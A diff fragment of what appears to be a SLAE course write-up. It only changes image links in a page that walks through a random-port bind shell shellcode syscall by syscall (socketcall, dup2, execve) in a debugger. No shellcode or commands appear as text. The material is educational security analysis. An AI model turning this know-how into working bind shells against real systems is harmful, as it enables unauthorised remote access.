-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/15.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/15.png"><br>
 <br>
 We read the man page of socketcall:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/16.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/16.png"><br>
 <br>
 And then the values are:<br>
 <br>
@@ -739,7 +739,7 @@ And then the values are:<br>
 <br>
 - ECX = -1073745200 => The stack address containing the pushed values "0x2" (<i>domain</i> is AF_INET), "0x1" (<i>type</i> is SOCK_STREAM) and "0x0" (<i>protocol</i> is not set):<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/31.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/31.png"><br>
 <br>
 <br>
 <br>
@@ -747,11 +747,11 @@ And then the values are:<br>
 <br>
 We reach the second syscall:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/17.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/17.png"><br>
 <br>
 We read the man page of socketcall:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/16.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/16.png"><br>
 <br>
 And then the values are:<br>
 <br>
@@ -761,7 +761,7 @@ And then the values are:<br>
 <br>
 - ECX = -1073745208 => The stack address containing the values "0x3" (<i>s</i>, the file descriptor) and "0x0" (<i>backlog</i>, which defines the maximum length to which the queue of pending connections for sockfd may grow.)<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/32.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/32.png"><br>
 <br>
 <br>
 <br>
@@ -769,11 +769,11 @@ And then the values are:<br>
 <br>
 We reach the third syscall:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/18.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/18.png"><br>
 <br>
 We read the man page of socketcall:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/16.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/16.png"><br>
 <br>
 And then the values are:<br>
 <br>
@@ -783,23 +783,23 @@ And then the values are:<br>
 <br>
 - ECX = -1073745208 => The stack address containing the values "0x3" (<i>socketfd</i>, the file descriptor), "0X0" (<i>addr</i>, so the address is '0.0.0.0') and "0x2" (<i>addrlen</i>, so the length of the address is 32 bits)<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/33.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/33.png"><br>
 <br>
 <br>
 Now, it is necessary to check which is the port opened and connect to it:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/19.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/19.png"><br>
 <br>
 <br>
 <h4> Syscall 4</h4><br>
 <br>
 Then, we reach the fourth syscall:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/20.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/20.png"><br>
 <br>
 We read the man page of dup2:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/25.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/25.png"><br>
 <br>
 And then the values are:<br>
 <br>
@@ -816,11 +816,11 @@ Later the breakpoint is reached again only changing the ECX value to 2, 1 and th
 <br>
 We reach the fifth syscall:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/27.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/27.png"><br>
 <br>
 We read the man page of execve:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/26.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/26.png"><br>
 <br>
 And then the values are:<br>
 <br>
@@ -837,13 +837,13 @@ And then the values are:<br>
 <br>
 Now we can update the nasm code adding the necessary jump:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/28.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/28.png"><br>
 <br>
 Finally we can compile the nasm file and check it works correctly:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/29.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/29.png"><br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/30.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/30.png"><br>
 <br>
 <br>
 <br>
